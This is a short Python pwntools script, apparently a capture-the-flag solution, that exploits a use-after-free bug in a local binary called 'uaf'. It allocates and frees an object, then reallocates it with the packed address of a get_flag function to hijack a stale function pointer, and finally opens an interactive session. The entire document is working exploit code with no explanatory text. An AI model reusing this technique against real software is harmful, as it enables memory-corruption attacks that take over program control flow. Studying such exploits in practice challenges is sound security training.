from pwn import *

get_flag = 0x0804863b

r = process('uaf')
print r.recvlines(6)

r.sendline('1')
print r.recvline()

r.sendline('AAAA')
print r.recvline()
r.sendline('AAAA')

print r.recvlines(6)
 
r.sendline('4')

print r.recvlines(6) 

r.sendline('2')
r.sendline(pack(get_flag)+"A"*8)

print r.recvlines(6)

r.sendline('3')
print r.recvline()
r.interactive()

